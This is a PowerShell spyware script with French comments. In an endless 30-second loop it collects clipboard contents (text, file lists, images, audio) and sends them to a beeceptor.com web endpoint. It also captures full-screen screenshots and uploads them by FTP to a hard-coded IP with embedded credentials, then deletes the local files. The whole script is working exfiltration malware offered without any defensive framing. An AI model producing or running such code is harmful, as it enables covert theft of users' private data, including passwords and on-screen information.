function Send-FullClipboard {
    $FormatList = "Text", "FileDropList", "Image", "Audio"
    $Result = @()
    $FormatList | % {
        $Result += (Get-Clipboard -Format $_)
    }
    Invoke-WebRequest -Uri "https://gbrclipboard.free.beeceptor.com/$($Result)" | Out-Null
}

function Send-ScreenShot {
    # Récupération des mensurations de l'écran
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    
    # Création d'un bitmap
    $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height

    # Création d'un objet "graphic" depuis le bitmap
    $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)

    # Screenshot !
    $Graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $Bitmap.Size)

    # Sauvegarde en fichier
    $FilePath = "$($env:TEMP)\$(Get-Random).bmp"
    $Bitmap.Save($FilePath)

    # Retourne le chemin du fichier
    Send-FTP -Server "10.101.200.61" -Port "21" -LocalFile $FilePath -User "ex" -Password "ex" -AuthMode "password" | Out-Null

    # Supprime le fichier
    Remove-Item -Path $FilePath -Force | Out-Null
}

while ($true) {
    # Persistence, une exfiltration toutes les 30 secondes
    Send-FullClipboard
    Send-ScreenShot
    Start-Sleep -Seconds 30
}